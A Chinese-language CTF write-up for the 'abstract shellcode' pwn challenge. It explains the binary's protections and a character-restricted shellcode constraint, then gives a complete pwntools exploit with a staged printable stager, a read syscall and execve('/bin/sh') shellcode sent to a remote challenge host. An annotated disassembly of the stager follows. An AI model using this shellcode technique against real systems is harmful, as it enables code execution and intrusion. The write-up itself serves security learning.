# abstract shellcode

确实挺抽象

## 文件分析

NX off, PIE on, Canary on, RELRO full  
ghidra分析为64位程序

## 解题思路

开始时读入一个ye/no，就可以开始输入shellcode了，一开始以为有16字节的限制，
还把字符范围限制在了`'O'~'_'`之间，但是实际动调时发现还有1个任意字符的机会

要想执行system，这么一些字节肯定不够，那么可以参照newstarctf里的shellcode_revenge，
先执行read，再执行，那么这最后的一个字节可以做什么呢，发现`'\xc3'`可以实现跳转，
这时候才意识过来，之前给的两个字符，是用来放syscall(`'\x0f\x05'`)的，
那么只要构造一个read系统调用，再读入execve的shellcode并执行就可以拿到shell

下文有shellcode的详细解释

## 踩过的坑

read的第三个参数`count`有最大值`SSIZE_MAX(0x7ffff000 on Linux)`，
超过这个值是依赖于实现的，当我随便找了一个超大数字时，我用的Arch Linux可以成功read，
Ubuntu就不行，害得我一开始连远端就寄，还得开虚拟机试试（毕竟是内核存在差别）

## EXPLOIT

```python
from pwn import *
context.arch = 'amd64'

def payload(lo):
    global sh
    if lo:
        sh = process('abstractshellcode')
    else:
        sh = remote('43.249.195.138', 21851)
    if lo & 0b10:
        gdb.attach(sh, gdbscript='b *$rebase(0x14aa)')

    # payload 1, place syscall on stack
    sh.send(b'\x0f\x05')

    # payload 2, control registers and return to syscall
    sh.send(b'P^WXOSZYY[YQYQYS\xc3')

    code = '''
    mov rbx, 0x68732f6e69622f
    push rbx
    push rsp
    pop rdi
    xor esi, esi
    xor edx, edx
    push 0x3b
    pop rax
    syscall
    '''
    shc = asm(code)

    # payload 3, execute /bin/sh
    sh.sendline(b'0'*(0x52 - 0x20) + shc)

    sh.interactive()
```

以下是对第二条payload的解释

```as
push rax ; P
pop  rsi ; ^ 读取到当前字符串开始处
push rdi ; W
pop  rax ; X 复制0给rax
push r11 ; OS (O: REX:WRXB -> 修饰rbx为r11)
pop  rdx ; Z 复制0x246给count参数
pop  rcx ; Y
pop  rcx ; Y
pop  rbx ; [ 先把syscall字符串所在地址读到rbx中
pop  rcx ; Y padding * 5
push rcx ; Q
pop  rcx ; Y
push rcx ; Q
pop  rcx ; Y
push rbx ; S 还原rbx的地址到rsp上
ret      ; \xc3 ; aka pop rip: 程序跳转到rbx的地址上
```

## 参考

[printable shellcode](https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php?title=X64_alphanumeric_opcodes)

Done.
